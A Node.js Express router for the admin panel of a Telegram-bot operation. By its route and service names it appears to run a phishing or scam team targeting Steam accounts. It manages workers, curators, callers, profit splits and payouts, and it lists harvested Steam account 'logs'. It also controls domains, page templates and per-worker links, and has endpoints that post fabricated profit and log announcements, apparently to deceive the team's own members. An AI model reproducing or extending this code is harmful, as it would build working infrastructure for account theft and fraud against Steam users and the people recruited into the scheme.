const express = require("express");
const ProfitTransaction = require("../models/ProfitTransaction");
const User = require("../models/User");
const WithdrawalRequest = require("../models/WithdrawalRequest");
const {
  verifyTelegramLogin,
  setSessionCookie,
  clearSessionCookie,
  requireAdmin,
} = require("./auth");
const { serializeMember, serializeApplication, serializePayout } = require("./serializers");
const {
  getUserByTelegramId,
  searchTeamMembers,
  listTeamMembers,
  listCurators,
  listCallers,
  setTeamMember,
  setBan,
  setCurator,
  setCaller,
  setModerator,
  setProfitPercent,
  addWalletBalanceUsd,
  findUserByQuery,
} = require("../services/userService");
const {
  getGlobalWorkerPercent,
  setGlobalWorkerPercent,
  getDisplayCurrency,
  setDisplayCurrency,
  getUsdRubRate,
  setUsdRubRate,
} = require("../services/settingsService");
const { getCurrencyContext, formatDisplayAmount } = require("../services/currencyService");
const { getAdminDashboardStats } = require("../services/adminStatsService");
const { getTopWorkers } = require("../services/topService");
const { addProfitToUserByTelegramId } = require("../services/profitService");
const {
  listApplications,
  getApplicationById,
  decideApplication,
} = require("../services/applicationService");
const { getForm, addFormQuestion, removeFormQuestion } = require("../services/formService");
const {
  ensureWorkerPanelAccount,
  recreateWorkerPanelAccount,
  bindWorkerPanelAccount,
} = require("../services/panelAccountService");
const {
  listDomains,
  getDomainDetail,
  previewAddDomain,
  addDomain,
  removeDomain,
  listTemplates,
  listTemplateVisibility,
  enableTemplateById,
  renameTemplateById,
  disableTemplateById,
  createLink,
  listWorkers,
  listTeamReferrals,
  updateTeamReferral,
  deleteTeamReferral,
} = require("../services/adminSitesService");
const { updateCuratorSettings } = require("../services/curatorService");
const { updateCallerSettings } = require("../services/callerService");
const {
  setAwaitingPayoutLink,
  completePayoutWithLink,
  rejectPayout,
} = require("../services/withdrawalService");
const { getBroadcastRecipients, runBroadcast } = require("../services/broadcastService");
const { seedManualsThread } = require("../services/manualsThreadService");
const { publishLaunchAnnounce } = require("../services/launchAnnounceService");
const { publishChangelog } = require("../services/changelogService");
const { publishOrRefreshDynamicPin } = require("../services/dynamicPinService");
const { fetchSteamAccountById, listSteamAccountsForAdmin } = require("../services/steamLogAdminService");
const { sendFakeSteamProfit, sendFakeSteamLog } = require("../services/steamMonitorService");
const { resolveFakeProfitSevenSkinQueries } = require("../services/steamMarketLookup");
const { parseFakeSteamLogInput } = require("../utils/fakeSteamLogInput");
const { getRecentLogsText } = require("../utils/logger");
const { env } = require("../config/env");

function createPanelRouter(bot) {
  const router = express.Router();

  router.get("/config", (_req, res) => {
    // Classic Telegram Login needs numeric bot_id (token prefix), never the secret.
    const botId = String(env.botToken || "").split(":")[0] || "";
    res.json({
      botUsername: env.botUsername || bot?.botInfo?.username || "",
      botId,
      authDisabled: Boolean(env.panelAuthDisabled),
    });
  });

  router.post("/auth/telegram", async (req, res) => {
    try {
      const result = verifyTelegramLogin(req.body || {});
      if (!result.ok) {
        const status = result.error === "not_admin" ? 403 : 401;
        return res.status(status).json({ error: result.error });
      }
      const { user: tg } = result;
      await User.findOneAndUpdate(
        { telegramId: tg.telegramId },
        {
          $set: {
            username: tg.username,
            firstName: tg.firstName,
            role: "admin",
            isTeamMember: true,
          },
          $setOnInsert: { telegramId: tg.telegramId },
        },
        { upsert: true, new: true }
      );
      setSessionCookie(res, tg.telegramId);
      return res.json({
        ok: true,
        user: {
          telegramId: tg.telegramId,
          username: tg.username,
          firstName: tg.firstName,
          lastName: tg.lastName,
          photoUrl: tg.photoUrl,
          role: "Админ",
        },
      });
    } catch (error) {
      return res.status(500).json({ error: error.message || "auth_failed" });
    }
  });

  router.post("/auth/logout", (_req, res) => {
    clearSessionCookie(res);
    res.json({ ok: true });
  });

  router.get("/me", requireAdmin, async (req, res) => {
    const currencyCtx = await getCurrencyContext();
    res.json({
      user: {
        ...serializeMember(req.admin, currencyCtx),
        roleLabel: "Админ",
        photoUrl: "",
      },
    });
  });

  router.get("/admin/overview", requireAdmin, async (_req, res) => {
    try {
      const currencyCtx = await getCurrencyContext();
      const [stats, pendingPayouts, series] = await Promise.all([
        getAdminDashboardStats("all"),
        WithdrawalRequest.countDocuments({
          status: { $in: ["pending", "awaiting_payout_link"] },
        }),
        getDailyProfitSeries(7),
      ]);
      const today = series[series.length - 1] || { total: 0, count: 0 };
      const yesterday = series[series.length - 2] || { total: 0 };
      const deltaPct =
        yesterday.total > 0
          ? Math.round(((today.total - yesterday.total) / yesterday.total) * 100)
          : null;

      res.json({
        currency: currencyCtx,
        kpi: {
          teamCount: stats.teamCount,
          pendingApps: stats.pendingNow,
          todayProfitUsd: today.total,
          todayProfitDisplay: formatDisplayAmount(today.total, currencyCtx),
          todayProfitDeltaPct: deltaPct,
          pendingPayouts,
        },
        series: series.map((row) => ({
          date: row.date,
          label: row.label,
          totalUsd: row.total,
          totalDisplay: formatDisplayAmount(row.total, currencyCtx),
          count: row.count,
        })),
        globalPercent: await getGlobalWorkerPercent(80),
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/stats", requireAdmin, async (req, res) => {
    try {
      const period = String(req.query.period || "all");
      const currencyCtx = await getCurrencyContext();
      const stats = await getAdminDashboardStats(period);
      res.json({
        ...stats,
        profits: {
          ...stats.profits,
          totalDisplay: formatDisplayAmount(stats.profits.totalProfit, currencyCtx),
        },
        currency: currencyCtx,
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/top", requireAdmin, async (req, res) => {
    try {
      const period = String(req.query.period || "all");
      const limit = Math.min(50, Math.max(1, Number(req.query.limit || 10)));
      const currencyCtx = await getCurrencyContext();
      const rows = await getTopWorkers(period, limit);
      res.json({
        period,
        currency: currencyCtx,
        rows: rows.map((row, i) => ({
          rank: i + 1,
          telegramId: String(row.telegramId || row.user?.telegramId || ""),
          username: row.username || row.user?.username || "",
          firstName: row.firstName || row.user?.firstName || "",
          count: Number(row.count || 0),
          totalUsd: Number(row.total || 0),
          totalDisplay: formatDisplayAmount(row.total || 0, currencyCtx),
        })),
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/members", requireAdmin, async (req, res) => {
    try {
      const q = String(req.query.q || "").trim();
      const currencyCtx = await getCurrencyContext();
      let users;
      if (q) users = await searchTeamMembers(q);
      else users = await listTeamMembers();
      res.json({
        members: users.map((u) => serializeMember(u, currencyCtx)),
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/members/roles/curators", requireAdmin, async (_req, res) => {
    const currencyCtx = await getCurrencyContext();
    const users = await listCurators();
    res.json({ members: users.map((u) => serializeMember(u, currencyCtx)) });
  });

  router.get("/admin/members/roles/callers", requireAdmin, async (_req, res) => {
    const currencyCtx = await getCurrencyContext();
    const users = await listCallers();
    res.json({ members: users.map((u) => serializeMember(u, currencyCtx)) });
  });

  router.get("/admin/members/:telegramId", requireAdmin, async (req, res) => {
    try {
      const user = await getUserByTelegramId(req.params.telegramId);
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/profit", requireAdmin, async (req, res) => {
    try {
      const amount = Number(req.body?.amount);
      if (!Number.isFinite(amount) || amount <= 0) {
        return res.status(400).json({ error: "Некорректная сумма" });
      }
      const result = await addProfitToUserByTelegramId(
        req.params.telegramId,
        amount,
        req.adminTelegramId
      );
      if (!result?.user) return res.status(404).json({ error: "not_found" });
      try {
        await bot.telegram.sendMessage(
          req.params.telegramId,
          `Вам начислен профит: $${Number(amount).toFixed(2)}`,
          { parse_mode: "HTML" }
        );
      } catch (_) {
        /* ignore DM failures */
      }
      const currencyCtx = await getCurrencyContext();
      res.json({
        ok: true,
        member: serializeMember(result.user, currencyCtx),
        workerShare: result.workerShare,
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/wallet", requireAdmin, async (req, res) => {
    try {
      const { user } = await addWalletBalanceUsd(req.params.telegramId, req.body?.amount);
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.patch("/admin/members/:telegramId/percent", requireAdmin, async (req, res) => {
    try {
      const percent = Math.max(1, Math.min(100, Number(req.body?.percent)));
      const user = await setProfitPercent(req.params.telegramId, percent);
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/message", requireAdmin, async (req, res) => {
    try {
      const text = String(req.body?.text || "").trim();
      if (!text) return res.status(400).json({ error: "empty_text" });
      await bot.telegram.sendMessage(req.params.telegramId, text, { parse_mode: "HTML" });
      res.json({ ok: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/role", requireAdmin, async (req, res) => {
    try {
      const { role, value } = req.body || {};
      const id = req.params.telegramId;
      let user;
      if (role === "curator") user = await setCurator(id, Boolean(value));
      else if (role === "caller") user = await setCaller(id, Boolean(value));
      else if (role === "moderator") user = await setModerator(id, Boolean(value));
      else if (role === "team") user = await setTeamMember(id, Boolean(value));
      else return res.status(400).json({ error: "unknown_role" });
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/ban", requireAdmin, async (req, res) => {
    try {
      const value = Boolean(req.body?.banned);
      const user = await setBan(req.params.telegramId, value);
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/kick", requireAdmin, async (req, res) => {
    try {
      const user = await setTeamMember(req.params.telegramId, false);
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.patch("/admin/members/:telegramId/curator-settings", requireAdmin, async (req, res) => {
    try {
      const user = await updateCuratorSettings(req.params.telegramId, {
        description: req.body?.description,
        percent: req.body?.percent,
        minProfits: req.body?.minProfits,
      });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.patch("/admin/members/:telegramId/caller-settings", requireAdmin, async (req, res) => {
    try {
      const user = await updateCallerSettings(req.params.telegramId, {
        description: req.body?.description,
        percent: req.body?.percent,
        minProfits: req.body?.minProfits,
      });
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/panel/create", requireAdmin, async (req, res) => {
    try {
      let user = await getUserByTelegramId(req.params.telegramId);
      if (!user) return res.status(404).json({ error: "not_found" });
      user = await ensureWorkerPanelAccount(user);
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/panel/recreate", requireAdmin, async (req, res) => {
    try {
      let user = await getUserByTelegramId(req.params.telegramId);
      if (!user) return res.status(404).json({ error: "not_found" });
      user = await recreateWorkerPanelAccount(user);
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/members/:telegramId/panel/bind", requireAdmin, async (req, res) => {
    try {
      let user = await getUserByTelegramId(req.params.telegramId);
      if (!user) return res.status(404).json({ error: "not_found" });
      const login = String(req.body?.username || "").trim();
      const password = String(req.body?.password || "").trim();
      user = await bindWorkerPanelAccount(user, login, password);
      const currencyCtx = await getCurrencyContext();
      res.json({ ok: true, member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/economy", requireAdmin, async (_req, res) => {
    try {
      const [globalPercent, currency, rate] = await Promise.all([
        getGlobalWorkerPercent(80),
        getDisplayCurrency("USD"),
        getUsdRubRate(90),
      ]);
      res.json({ globalPercent, currency, rate });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.patch("/admin/economy", requireAdmin, async (req, res) => {
    try {
      const body = req.body || {};
      const out = {};
      if (body.globalPercent != null) {
        out.globalPercent = await setGlobalWorkerPercent(body.globalPercent);
      }
      if (body.currency != null) {
        out.currency = await setDisplayCurrency(body.currency);
      }
      if (body.rate != null) {
        out.rate = await setUsdRubRate(body.rate);
      }
      const [globalPercent, currency, rate] = await Promise.all([
        getGlobalWorkerPercent(80),
        getDisplayCurrency("USD"),
        getUsdRubRate(90),
      ]);
      res.json({ ok: true, ...out, globalPercent, currency, rate });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/economy/fake-profit", requireAdmin, async (req, res) => {
    try {
      const anonymous = Boolean(req.body?.anonymous);
      const ownerTelegramId = String(req.body?.ownerTelegramId || "").trim();
      const resolved = await resolveFakeProfitSevenSkinQueries(String(req.body?.text || ""));
      if (resolved.error) return res.status(400).json({ error: resolved.error });
      await sendFakeSteamProfit(bot, {
        items: resolved.items,
        total: resolved.total,
        anonymous,
        ownerTelegramId: anonymous ? "" : ownerTelegramId,
      });
      res.json({ ok: true, total: resolved.total, count: resolved.items.length });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/economy/fake-log", requireAdmin, async (req, res) => {
    try {
      const ownerTelegramId = String(req.body?.ownerTelegramId || "").trim();
      if (!ownerTelegramId) {
        return res.status(400).json({ error: "Укажите Telegram ID получателя" });
      }
      const parsed = parseFakeSteamLogInput(String(req.body?.text || ""));
      if (parsed.error) return res.status(400).json({ error: parsed.error });
      await sendFakeSteamLog(bot, {
        account: parsed.account,
        ownerTelegramId,
      });
      res.json({ ok: true });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/apps", requireAdmin, async (req, res) => {
    try {
      const kind = String(req.query.kind || "pending");
      const page = Math.max(0, Number(req.query.page || 0));
      const result = await listApplications({
        status: kind === "pending" ? "pending" : undefined,
        statuses: kind === "closed" ? ["accepted", "rejected"] : undefined,
        page,
      });
      const apps = (result.items || []).map((doc) => {
        const u = doc.userId && typeof doc.userId === "object" ? doc.userId : null;
        return {
          ...serializeApplication(doc),
          username: u?.username || "",
          telegramId: u?.telegramId || "",
        };
      });
      res.json({
        page,
        total: result.total ?? apps.length,
        totalPages: result.totalPages,
        apps,
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/apps/:id", requireAdmin, async (req, res) => {
    try {
      const app = await getApplicationById(req.params.id);
      if (!app) return res.status(404).json({ error: "not_found" });
      const u = app.userId ? await User.findById(app.userId).lean() : null;
      res.json({
        application: {
          ...serializeApplication(app),
          username: u?.username || "",
          telegramId: u?.telegramId || "",
        },
      });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.post("/admin/apps/:id/decide", requireAdmin, async (req, res) => {
    try {
      const action = String(req.body?.action || "");
      if (action !== "accept" && action !== "reject") {
        return res.status(400).json({ error: "invalid_action" });
      }
      const decided = await decideApplication(bot.telegram, req.params.id, action, {
        id: req.adminTelegramId,
        first_name: req.admin?.firstName || "Admin",
        username: req.admin?.username || "",
      });
      if (!decided?.ok) {
        const reason = decided?.reason || "decide_failed";
        const messages = {
          same_status: "Заявка уже в этом статусе",
          not_found: "Заявка не найдена",
          invalid_action: "Некорректное действие",
          already_processed: "Заявку нельзя обработать",
        };
        return res.status(400).json({ error: messages[reason] || reason, reason });
      }
      res.json({
        ok: true,
        reversed: Boolean(decided.reversed),
        previousStatus: decided.previousStatus || "",
        application: serializeApplication(decided.updated),
      });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/forms/:formId", requireAdmin, async (req, res) => {
    try {
      const form = await getForm(req.params.formId || "teamApplication");
      res.json({ form });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.post("/admin/forms/:formId/questions", requireAdmin, async (req, res) => {
    try {
      const question = await addFormQuestion(req.params.formId || "teamApplication", {
        label: req.body?.label,
        prompt: req.body?.prompt,
      });
      const form = await getForm(req.params.formId || "teamApplication");
      res.json({ ok: true, question, form });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.delete("/admin/forms/:formId/questions/:key", requireAdmin, async (req, res) => {
    try {
      const form = await removeFormQuestion(
        req.params.formId || "teamApplication",
        req.params.key
      );
      res.json({ ok: true, form });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/payouts", requireAdmin, async (req, res) => {
    try {
      const status = String(req.query.status || "open");
      const filter =
        status === "open"
          ? { status: { $in: ["pending", "awaiting_payout_link"] } }
          : status === "all"
            ? {}
            : { status };
      const rows = await WithdrawalRequest.find(filter).sort({ createdAt: -1 }).limit(50);
      res.json({ payouts: rows.map(serializePayout) });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.post("/admin/payouts/:id/approve", requireAdmin, async (req, res) => {
    try {
      const updated = await setAwaitingPayoutLink(req.params.id, req.adminTelegramId);
      res.json({ ok: true, payout: serializePayout(updated) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/payouts/:id/link", requireAdmin, async (req, res) => {
    try {
      const updated = await completePayoutWithLink(
        req.params.id,
        String(req.body?.url || ""),
        req.adminTelegramId
      );
      res.json({ ok: true, payout: serializePayout(updated) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/payouts/:id/reject", requireAdmin, async (req, res) => {
    try {
      const updated = await rejectPayout(req.params.id, req.adminTelegramId);
      res.json({ ok: true, payout: serializePayout(updated) });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/comms/broadcast", requireAdmin, async (req, res) => {
    try {
      const text = String(req.body?.text || "").trim();
      if (!text) return res.status(400).json({ error: "empty_text" });
      const draft = {
        text,
        entities: [],
        buttons: [],
      };
      const result = await runBroadcast(bot.telegram, draft);
      res.json({ ok: true, result });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/comms/recipients", requireAdmin, async (_req, res) => {
    try {
      const recipients = await getBroadcastRecipients();
      res.json({ count: recipients.length });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.post("/admin/comms/manuals-thread", requireAdmin, async (_req, res) => {
    try {
      const result = await seedManualsThread(bot.telegram);
      res.json({ ok: true, result });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/comms/launch-announce", requireAdmin, async (_req, res) => {
    try {
      const result = await publishLaunchAnnounce(bot.telegram);
      res.json({ ok: true, result });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/comms/changelog", requireAdmin, async (_req, res) => {
    try {
      const result = await publishChangelog(bot.telegram);
      res.json({ ok: true, result });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.post("/admin/comms/dynamic-pin", requireAdmin, async (_req, res) => {
    try {
      const result = await publishOrRefreshDynamicPin(bot.telegram);
      res.json({ ok: true, result });
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/steam-logs", requireAdmin, async (req, res) => {
    try {
      const id = String(req.query.id || "").trim();
      if (id) {
        const account = await fetchSteamAccountById(id);
        return res.json({ account });
      }
      const list = await listSteamAccountsForAdmin({
        offset: Number(req.query.offset || 0),
        limit: Number(req.query.limit || 30),
        filter: String(req.query.q || ""),
      });
      res.json(list);
    } catch (error) {
      res.status(400).json({ error: error.message });
    }
  });

  router.get("/admin/bot-logs", requireAdmin, async (req, res) => {
    try {
      const text = getRecentLogsText(Number(req.query.lines || 250));
      res.type("text/plain").send(text);
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/search", requireAdmin, async (req, res) => {
    try {
      const user = await findUserByQuery(String(req.query.q || ""));
      if (!user) return res.status(404).json({ error: "not_found" });
      const currencyCtx = await getCurrencyContext();
      res.json({ member: serializeMember(user, currencyCtx) });
    } catch (error) {
      res.status(500).json({ error: error.message });
    }
  });

  router.get("/admin/sites/domains", requireAdmin, async (req, res) => {
    try {
      res.json(await listDomains(req.admin));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/admin/sites/domains/:id", requireAdmin, async (req, res) => {
    try {
      res.json(await getDomainDetail(req.admin, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/admin/sites/domains/check", requireAdmin, async (req, res) => {
    try {
      res.json(await previewAddDomain(req.admin, req.body?.domain));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/admin/sites/domains", requireAdmin, async (req, res) => {
    try {
      res.json(await addDomain(req.admin, req.body?.domain));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/admin/sites/domains/:id", requireAdmin, async (req, res) => {
    try {
      res.json(await removeDomain(req.admin, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/admin/sites/templates", requireAdmin, async (req, res) => {
    try {
      res.json(await listTemplates(req.admin));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/admin/sites/templates/visibility", requireAdmin, async (req, res) => {
    try {
      res.json(await listTemplateVisibility(req.admin));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/admin/sites/templates/visibility", requireAdmin, async (req, res) => {
    try {
      res.json(
        await enableTemplateById(req.admin, req.body?.id ?? req.body?.templateId, {
          name: req.body?.name,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.patch("/admin/sites/templates/visibility/:id", requireAdmin, async (req, res) => {
    try {
      res.json(await renameTemplateById(req.admin, req.params.id, req.body?.name));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/admin/sites/templates/visibility/:id", requireAdmin, async (req, res) => {
    try {
      res.json(await disableTemplateById(req.admin, req.params.id));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.post("/admin/sites/domains/:id/links", requireAdmin, async (req, res) => {
    try {
      res.json(
        await createLink(req.admin, req.params.id, {
          path: req.body?.path,
          templateId: req.body?.templateId,
          windowType: req.body?.windowType,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/admin/sites/workers", requireAdmin, async (req, res) => {
    try {
      res.json(await listWorkers(req.admin));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.get("/admin/sites/referrals", requireAdmin, async (req, res) => {
    try {
      res.json(await listTeamReferrals(req.admin));
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.patch("/admin/sites/referrals/:telegramId/:domainId", requireAdmin, async (req, res) => {
    try {
      res.json(
        await updateTeamReferral(
          req.admin,
          { telegramId: req.params.telegramId, domainId: req.params.domainId },
          {
            templateId: req.body?.templateId,
            windowType: req.body?.windowType,
          }
        )
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  router.delete("/admin/sites/referrals/:telegramId/:domainId", requireAdmin, async (req, res) => {
    try {
      res.json(
        await deleteTeamReferral(req.admin, {
          telegramId: req.params.telegramId,
          domainId: req.params.domainId,
        })
      );
    } catch (error) {
      res.status(error.status || 400).json({ error: error.message });
    }
  });

  return router;
}

async function getDailyProfitSeries(days = 7) {
  const since = new Date(Date.now() - days * 24 * 60 * 60 * 1000);
  const rows = await ProfitTransaction.aggregate([
    { $match: { createdAt: { $gte: since } } },
    {
      $group: {
        _id: {
          y: { $year: "$createdAt" },
          m: { $month: "$createdAt" },
          d: { $dayOfMonth: "$createdAt" },
        },
        total: { $sum: "$amount" },
        count: { $sum: 1 },
      },
    },
    { $sort: { "_id.y": 1, "_id.m": 1, "_id.d": 1 } },
  ]);

  const byKey = new Map();
  for (const row of rows) {
    const key = `${row._id.y}-${row._id.m}-${row._id.d}`;
    byKey.set(key, {
      total: Number(row.total || 0),
      count: Number(row.count || 0),
    });
  }

  const out = [];
  for (let i = days - 1; i >= 0; i -= 1) {
    const d = new Date();
    d.setHours(12, 0, 0, 0);
    d.setDate(d.getDate() - i);
    const key = `${d.getFullYear()}-${d.getMonth() + 1}-${d.getDate()}`;
    const hit = byKey.get(key) || { total: 0, count: 0 };
    out.push({
      date: d.toISOString().slice(0, 10),
      label: formatDayLabel(d),
      total: hit.total,
      count: hit.count,
    });
  }
  return out;
}

function formatDayLabel(d) {
  const months = [
    "янв.",
    "фев.",
    "мар.",
    "апр.",
    "мая",
    "июн.",
    "июл.",
    "авг.",
    "сен.",
    "окт.",
    "ноя.",
    "дек.",
  ];
  return `${d.getDate()} ${months[d.getMonth()]}`;
}

module.exports = { createPanelRouter };
